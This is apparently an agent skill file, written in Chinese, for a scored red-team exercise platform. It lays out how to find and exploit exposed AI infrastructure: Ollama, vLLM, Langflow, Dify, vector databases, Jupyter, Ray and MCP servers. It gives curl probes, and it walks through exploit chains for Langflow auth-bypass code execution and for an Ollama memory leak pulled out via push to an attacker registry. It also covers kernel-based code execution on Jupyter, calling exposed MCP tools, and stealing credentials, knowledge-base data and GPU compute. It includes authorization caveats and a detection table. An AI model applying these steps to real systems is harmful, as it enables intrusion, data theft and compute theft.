---
name: ai-infra-attack
description: AI 基础设施攻击面：Ollama/vLLM/llama.cpp 推理引擎、Langflow/Dify/RAGFlow 低代码 Agent 平台、向量库、训练调度（Jupyter/MLflow/Ray/Triton）、MCP server 的暴露面直取与利用
whenToUse: 扫到 11434/8000/7860/6333/19530/8265/8888 这类端口，或页面是 AI 对话/RAG 知识库/工作流编排界面；靶标含"智能体/大模型/知识库/算力"字样
---

# AI 基础设施攻击（2026 的新主战场）

这类服务有三个特征，决定了它是**性价比最高的一类靶子**：

1. **默认无鉴权**。Ollama 的 `11434`、vLLM 的 `8000`、Ray 的 `8265`、Jupyter 的 `8888`，装完就能用，没人配认证；
2. **一个端口就是一条完整权限**。连上 Ollama 就能拉/删/导出模型，连上 Ray 就能在宿主机执行任意命令；
3. **分值高且少人打**。对应得分点 `ai-agent`（100/个）、`model-compute`（500）、`model-data`（500）、`computepower-admin`（500）、`computepower-cards`（10/张）——**同一台机器按平台权限记 500，别按普通 Web 记 100**。

> 边界：只打授权范围内的目标。本技能默认走「只读判定 → 取证 → 再决定是否深入」，
> 未授权的删除/覆盖类操作（`/api/delete`、模型覆盖写）一律不做。

## 一、先判是什么（端口速查）

| 端口 | 服务 | 一句话判定 |
|---|---|---|
| 11434 | Ollama | `GET /api/tags` 返回 `{"models":[...]}` 即未授权 |
| 8000 / 8001 / 8002 | vLLM / Triton | `GET /v1/models` 返回模型列表；Triton 的 8002 是 gRPC |
| 8080 | llama.cpp server / Weaviate | `GET /props` 或 `GET /v1/models` |
| 7860 | Langflow / Gradio | `GET /config` 有 `components`；Langflow 有 `/api/v1/...` |
| 3000 / 80 | Dify | 登录页 + `GET /console/api/setup` 返回 `{"step":"finished"}` 说明已初始化 |
| 9380 / 80 | RAGFlow | `/v1/api/...`，首页有 RAGFlow 标识 |
| 19530 | Milvus | gRPC；HTTP 侧 9091 是 metrics |
| 6333 / 6334 | Qdrant | `GET /collections` 返回集合名 |
| 8080 / 50051 | Weaviate | `GET /v1/meta` |
| 8000 | Chroma | `GET /api/v1/heartbeat`（老版 `/api/v1/collections`） |
| 8888 | Jupyter | `GET /api` 返回 `{"version":...}`，`/tree` 能列目录 |
| 5000 | MLflow | `GET /api/2.0/mlflow/experiments/search` |
| 8265 | Ray Dashboard | `GET /nodes?view=summary`，有 `ray_version` |
| 3000 | Grafana（常与 AI 平台同机） | `/api/health` |

**统一先跑一遍**（不写任何东西）：

```bash
for p in 11434 8000 7860 6333 8888 8265 5000 9380; do
  printf "%-6s " "$p"
  curl -s -m 4 -o /dev/null -w "%{http_code}\n" "http://<target>:$p/" || echo "-"
done
```

命中后按下面对应章节深入。**每一步都要把原始请求与回显留证**（`redteam_http_evidence_add` 或 `op=entity_add entity=http`）。

## 二、Ollama（11434）——最高频，一台就是 500 分

```bash
# 1) 未授权判定（只读）
curl -s http://<target>:11434/api/tags          # 模型清单
curl -s http://<target>:11434/api/version       # 版本，决定后面能不能打

# 2) 取证：模型清单本身就是「模型相关数据系统」的证据
curl -s http://<target>:11434/api/tags > runs/ollama-tags.json
curl -s http://<target>:11434/api/ps            # 正在跑的模型（说明有人用 = 生产环境）

# 3) 模型导出（model-data 得分）：只对授权范围内做，导出到 runs/ 不要外传
curl -s http://<target>:11434/api/show -d '{"name":"<模型名>"}'
```

**CVE-2026-7482（Ollama GGUF 堆越界读）**：**Ollama < 0.17.1**，`/api/create` 接受攻击者提供的
GGUF 文件，其中声明的 tensor offset/size 超出文件实际长度；量化时（`fs/ggml/gguf.go`、
`server/quantization.go` 的 `WriteTo()`）服务端读过堆缓冲区末尾。泄露内容可含环境变量、
API key、系统提示词、并发用户会话数据。

**外带路径别漏**：泄露结果要**通过 `/api/push` 推到攻击者控制的 registry** 才能取出来 ——
上游 `/api/create` 与 `/api/push` **都没有鉴权**。默认只绑 `127.0.0.1`，但文档推荐的
`OLLAMA_HOST=0.0.0.0` 在实践中被广泛使用（公网暴露量很大）。

CNA 评分 8.8（CVSS 4.0，AV:N/PR:N/UI:N，VC:H/VA:H）；NVD 自身未另评。
**打之前确认是不是 0.17.1 以下**（`/api/version` 或 `curl /`），并对准「push 外带」这条链 ——
只触发崩溃说明不了泄露成功，反而打崩目标就没了。**不要反复打**。

**算力盗取**（`computepower-cards`，10 分/张）：`/api/ps` 里能看到已加载模型与显存占用，
结合 `/api/generate` 能白嫖推理；多卡机器按卡数记。**记分时写明显卡型号与张数**。

## 三、vLLM / llama.cpp（8000 / 8080）

vLLM 是 OpenAI 兼容接口，**默认没有 API key**：

```bash
curl -s http://<target>:8000/v1/models
curl -s http://<target>:8000/v1/chat/completions \
  -H 'Content-Type: application/json' \
  -d '{"model":"<模型名>","messages":[{"role":"user","content":"ping"}]}'
```

能返回补全 = 拿到推理权限。**注意**：vLLM 的 `--api-key` 是常见加固项，返回 401 就说明配了，
不要再爆破（这不是登录口，爆破只会刷日志）。

llama.cpp server：`GET /props` 看 `default_generation_settings`，`POST /completion` 直接推。

## 四、Langflow（7860）——已进 CISA KEV，打了就是 RCE

Langflow 是低代码 Agent 编排平台，一台机器上通常同时跑着 **LLM API key、向量库凭据、RAG 文档库**，
所以它一旦被打穿，等于把整个 AI 应用的数据面一起交了。

已知洞（**按版本对号，不要盲打**；下表的修复版本与 CVSS 均已对过 NVD 官方页）：

| CVE | 类型 | 影响/修复版本 | 要点 |
|---|---|---|---|
| CVE-2025-3248 | 认证绕过 → RCE（CVSS 9.8） | `< 1.3.0` | `/api/v1/validate/code` 未鉴权即可 `exec()` 用户代码。2025-04 披露，**2025-05-05 进 KEV**；披露数小时即在野利用 |
| CVE-2026-9198 | 认证绕过链 → RCE（CVSS 9.8） | `1.0.0 ~ 1.10.0`，1.10.1 修 | **两步链**：`/api/v1/auto_login` 给任意网络调用者签发 SUPERUSER token → 再用 `/api/v1/validate/code` 执行代码。**2026-08-04 进 KEV** |
| CVE-2025-34291 | CORS 误配 → 账户接管 → RCE（CVSS 4.0 9.4） | `<= 1.6.9` | `allow_origins='*'` + `allow_credentials=True` + refresh cookie `SameSite=None` → 恶意网页跨域拿到 victim 的新 token 对。**需要受害者打开页面（UI:P）**，纯流量打不下来 |
| CVE-2026-5027 | 路径遍历（CVSS 3.1 8.8） | `langflow < 1.9.0` | `POST /api/v2/files` 的 multipart `filename` 未过滤，`../` 可写任意位置。**PR:L（需低权限）**，不是未授权；RCE 需配合后续写文件落点 |

**打的时候按「能不能无凭据」分层**：`CVE-2025-3248` / `CVE-2026-9198` 是**真正未授权**，
优先试；`CVE-2026-5027` 需要先有低权限账号，`CVE-2025-34291` 需要受害者交互 ——
后两者在纯黑盒里往往打不通，别把时间耗在这。

```bash
curl -s http://<target>:7860/health          # 存活
curl -s http://<target>:7860/api/v1/version  # 版本 → 对上面的表
# 未授权自检（CVE-2026-9198 第一步）：能拿到 token 说明 auto_login 没关
curl -s -X POST http://<target>:7860/api/v1/auto_login -H 'Content-Type: application/json' -d '{}'
```

**验伤（这四个洞的假成功方式各不相同，必须分开判）**：
- **CVE-2025-3248 / CVE-2026-9198**：判据是**命令回显**，不是 HTTP 200。
  `validate/code` 里塞 `print(7*7)`，响应里要出现 `49`（或你指定的任意标记）；
  `/api/v1/version` 回 200 只能说明服务活着，跟洞无关。
  返回 `{"detail":"Not Found"}` = 路由已被移除（打不上，版本太新）。
- **CVE-2026-5027**：判据是**目标机上真出现那个文件** —— 写 `../../../../tmp/pwned_<随机>`
  再用读接口/另一个洞回读确认。响应 200 只说明「请求被接受」，不代表文件落盘。
  且它需要低权限 token，**先用匿名请求试**：401 就直接换别的洞，别在爆破账号上耗。
- **CVE-2025-34291**：判据是**从攻击者 origin 收到了 victim 的 refresh_token**。
  只看到 CORS 头里回显 `Access-Control-Allow-Origin: <你的域>` 是**误配特征存在**，
  不等于拿到了 token —— 还得 `allow_credentials=True` 且浏览器真的带上了 cookie。
  这一步天然需要受害者交互，纯 curl 复现不了。
- 通用陷阱：`curl` 不看 `Content-Type` 就会把 HTML 当 JSON 成功解析。**先 `curl -i` 看头**。

命中后优先取 **环境变量里的模型 key 与数据库连接串**（这是 `model-data` 与 `db-credential` 的双份分），
再把工作流 JSON 导出（里面常含内网地址与凭据）。

## 五、Dify（80 / 3000）

Dify 的典型问题是**安全债**：`SECRET_KEY` 硬编码、IDOR、内部端点未授权暴露。

```bash
curl -s http://<target>/console/api/setup                 # {"step":"finished"} 说明已初始化
curl -s http://<target>/api/workspaces/current/members     # 未授权时直接出成员列表
```

重点看三类：
1. `/console/api/` 下的管理接口是否跳过鉴权（IDOR：换 `workspace_id` / `app_id` 越权读别人的应用）；
2. 硬编码 `SECRET_KEY` → 可伪造 JWT 直接登管理员（拿到就是 `ai-agent` 的"能操作 agent 工具"证据）；
3. 内部端点（`/v1/internal/`）暴露 → 直接调模型、读知识库。

## 六、RAGFlow / 向量库——数据面

RAGFlow（9380/80）：`/v1/api/` 下的 dataset/document 接口，未授权能列全部知识库与文档。

向量库基本都是裸的：

```bash
curl -s http://<target>:6333/collections                    # Qdrant
curl -s http://<target>:8080/v1/meta                        # Weaviate
curl -s http://<target>:8000/api/v1/collections             # Chroma
# Milvus 走 gRPC 19530，用 pymilvus：connections.connect(host=..., port=19530)
```

拿到集合名后直接 `scroll`/`search` 拉向量与原文——**知识库原文就是 `model-data` 的"模型相关数据"证据**，
记分时写清「哪个库、多少条、什么业务数据」。**注意**：不要 dump 全量，抽 100 条证明可达即可，
全量导出既慢又容易触发告警。

## 七、训练与调度——最容易一击致命

| 服务 | 端口 | 打法 |
|---|---|---|
| Jupyter | 8888 | `/api/contents` 列目录 → `/api/kernels` 起内核 → 执行任意代码（等于宿主机 shell） |
| MLflow | 5000 | 未授权读实验/artifact；artifact 里常含训练数据与凭据 |
| Ray Dashboard | 8265 | 未授权提交 job → **宿主机任意命令**（ShadowRay 类问题，`/api/jobs`） |
| Triton | 8000/8002 | 模型仓库路径遍历、模型投毒 |
| Kubeflow | 80 | 未授权 pipeline 上传 → 集群内执行 |

Jupyter 是最快的一条：

```bash
curl -s http://<target>:8888/api/contents?path=/        # 列目录
curl -s -X POST http://<target>:8888/api/kernels -H 'Content-Type: application/json' -d '{}'
# 拿到 kernel id 后走 /api/kernels/<id>/channels 的 websocket 执行
```

Ray 更直接（**只读判定，别真提交 job**，提交了等于在别人生产集群上跑命令）：

```bash
curl -s "http://<target>:8265/nodes?view=summary" | head -c 800
```

## 八、MCP server——2026 年新增的一类暴露面

Agent 工具链的 MCP server 常被直接暴露在 HTTP 上，且**多数没有认证**：

```bash
curl -s -X POST http://<target>:<port>/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
```

能列出工具 = 能调工具。重点看有没有 `exec`/`shell`/`read_file`/`http_request` 这类工具——
有的话就是**直接命令执行**（对应 `ai-agent` 的"能操作 agent 工具"）。同一个端点还能 `tools/call`。

## 九、判定顺序（先轻后重，别一上来就 RCE）

1. **只读探测**：版本、模型清单、集合名、节点列表——全部 GET，不改变任何状态；
2. **取证**：把返回体存 `runs/`，记 `http` 证据；
3. **落库**：`asset`（这台是 AI 平台，写清产品+版本）+ `vuln`（未授权/具体 CVE）；
4. **记分**：先判是哪一类——
   - 推理引擎/Agent 平台的控制权 → `ai-agent` 或 `model-compute`（**500 档，别记成 web-app 100**）
   - 知识库/训练数据原文 → `model-data`
   - 算力卡资源 → `computepower-cards`（按张数）
   - 只是暴露了个 Web 登录页 → 才走 `web-app`
5. **再决定深入**：拿 shell（`webshell-toolkit`）、取凭据横向（`credential-attack`）。

## 十、常见误判（踩过的）

- **把 Ollama 的 11434 当成普通 HTTP 服务**：它没有登录页，`/` 返回 `Ollama is running`，
  很多人以为没东西就走了。**必须打 `/api/tags`**。
- **把 vLLM 的 401 当成"有洞打不进去"**：401 是配了 api-key，是加固到位，不是漏洞。
- **把 Langflow 的 Gradio 界面当成普通 Web**：`/config` 会泄露全部组件与后端地址。
- **记分档次记错**：AI 平台按 `model-compute` 500，不要因为"它是个网页"就记 `web-app` 100——
  这是同一台机器上最容易丢的 400 分。



## 检测视角（防守方在日志里看到什么）

| 动作 | 防守方看哪里 | 典型信号 |
| --- | --- | --- |
| Web 漏洞利用 | WAF / 应用访问日志 | 请求体含已知 payload 形态；同一 IP 短时多路径探测 |
| 未授权接口 | 应用日志 401/403 | 同一会话从 200 变 401 再变 200（越权探测） |
| 反序列化 / 注入 | 应用错误日志 | 异常堆栈；出站 DNS/LDAP 请求（外带验证） |

**实用推论**：**判据是「应用侧日志 + 出口流量」两处同时看**：单看 WAF 会被编码绕过，单看出口会被加密隧道漏掉。Web 攻击必有 HTTP 请求，而它的验证动作（回连/DNS）几乎必然出网。

<!-- second-shot:start scripts/inject-second-shot.mjs 生成，勿手改 -->

## 第二发（主力打不出去时，按这个顺序换）

1. **前提没满足就先回去**：`web-fingerprint`、`nuclei-scan` —— 上一环没做实，本环再试也是空打

2. **无回显 / 被拦**：先用 `oob-verification` 确认是不是真没打进去（没回显 ≠ 没命中）；确认被 WAF 拦就转 `waf-bypass`

**纪律**：同一手法不许连打三次（第一次是验证、第二次换参数、第三次必须换手法）；换完还不动，就**如实回报**试过哪几条、各自现象是什么——这是下一次改打的依据，不是失败。

second-shot:end -->



## ATT&CK 映射

> 本技能会执行的手法对应 MITRE ATT&CK v20.1 下列技术（编号来自 `lib/redteam/attack-map.js`，唯一来源）。

| 战术 | 编号 | 技术 |
| --- | --- | --- |
| 初始访问 | T1190 | 利用面向公众的应用 |
| 执行 | T1648 | 无服务器执行 |
| 发现 | T1526 | 云服务发现 |

落到事实库时，把这几个编号写进 `attack_step` 的标题或 `detail`：报告与检测配对要靠它们对齐；
**没写编号的动作在「按 ATT&CK 复核」时等于不存在**（防守方按技术编号查日志，查不到就是漏）。

<!-- skill-link-graph:build-skill-graph.mjs 生成，勿手改 -->

## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）

- **阶段**：3 漏洞发现｜**角色**：`vuln-scan`
- **上游**（先做完这些再进来）：`web-fingerprint`、`nuclei-scan`
- **下游**（产出交给谁）：`credential-attack`、`webshell-toolkit`、`llm-security`
- **落库**（做完必须记进演练台，没落库的发现等于没发生）：`vuln` —— 用对应的 `redteam_*` 工具写入，带上原始请求/证据
- **收口必做**（打完不算完，要能证明）：命中判定走 `verification-discipline`（误报排除 + 修复五档判定）；打完之后要**补丁后复测**（补丁/修复后再打一遍，确认真的关掉了，而不是换个入口还能打）也走它；说清对手能不能发现走 `detection-pairing`（检测规则 + 响度）；战果归到哪个战术走 `attack-traceability`（ATT&CK 映射）。**出交付物用 `redteam_report`**（kind=score 出计分战报、kind=targets 出靶标清单），整条链路串起来看用 `redteam_attack_chain` / `redteam_attack_path` —— 这两个只在 `redteam-setup` 的工具表里登记过，做具体攻击时不会想到去翻，所以在这里点名

- **配套工具**（做完这步要落库/查询时用，别只记在上下文里）：`redteam_vuln_query`（按 severity/status/cve/cidr 组合筛，别在长列表里翻）

<!-- /skill-link-graph -->

<!-- runnability:start scripts/inject-runnability.mjs 生成，勿手改 -->

## 本机可执行性（自动探测；命令是按 Linux/Kali 写的，照抄会撞空）

命令含 Linux 专属形态（`sudo` / `apt` / `/usr/share` 等）：本机是 Windows，**去掉 sudo**、把绝对路径换成工具目录（`$DSH_HOME/redteam/toolkit/<name>/`），`.exe` 后缀别漏。

runnability:end -->
